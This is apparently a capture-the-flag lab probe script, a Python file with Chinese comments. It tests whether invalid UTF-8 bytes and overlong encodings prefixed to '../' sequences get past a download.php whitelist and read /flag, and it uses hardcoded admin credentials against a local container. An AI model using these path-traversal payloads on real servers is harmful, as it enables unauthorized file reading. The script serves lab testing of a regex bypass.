#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
web02_regex_probe.py — 实测 download.php 白名单的"非法 UTF-8 绕过"（README §4.1 推测 A′）

用法：
    python web02_regex_probe.py [target]

★ 必须直接拼百分号编码，不能用 requests 的 params=：
   requests 会把 '\\xff' 按 UTF-8 编成 %C3%BF，那变成**合法 UTF-8**，
   就测不出"非法 UTF-8 让 preg_match 返回 false"的效果了。
"""
import re
import sys

import requests

requests.packages.urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8')

T = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8090').rstrip('/')
S = requests.Session()
S.trust_env = False
S.auth = ('admin', 'admin123')

# 路径推导：/var/www/uploads/ + <非法字节>/../../../../flag
#   components: var www uploads <bad> .. .. .. .. flag
#   从 /var/www/uploads/<bad>/ 上跳 4 层 = /  → 命中 /flag
CASES = [
    ('对照：纯 ASCII 穿越（应始终被拦）', '/download.php?file=../../../flag'),
    ('A′：原始非法字节 %ff%fe + 穿越',   '/download.php?file=%ff%fe/../../../../flag'),
    ('A′：原始非法字节 %80 + 穿越',      '/download.php?file=%80/../../../../flag'),
    ('A′：%c0%af 过度长编码',            '/download.php?file=%c0%af/../../../../flag'),
    ('对照：合法 ASCII 文件名（应放行到 404）', '/download.php?file=nope.jpg'),
]


def main():
    print(f'[*] 目标 {T}')
    print(f'[*] 当前 WEAK_REGEX = ', end='')
    try:
        import subprocess
        out = subprocess.run(['docker', 'exec', 'qwb-r2-web02-app', 'printenv', 'WEAK_REGEX'],
                             capture_output=True, text=True, timeout=15)
        print((out.stdout or '').strip() or '(未取到)')
    except Exception:
        print('(无法读取，跳过)')

    hits = 0
    for name, path in CASES:
        try:
            r = S.get(T + path, timeout=10, verify=False)
            m = re.search(rb'flag\{[^}]*\}', r.content)
            if m:
                hits += 1
                print(f'  ★ {name:36s} -> {r.status_code}  {m.group().decode()}')
            else:
                print(f'    {name:36s} -> {r.status_code} len={len(r.content):6d} {r.content[:34]!r}')
        except Exception as e:
            print(f'    {name:36s} -> ERR {type(e).__name__}')
    print(f'\n  出 flag 的用例数：{hits}')
    return 0


if __name__ == '__main__':
    sys.exit(main())
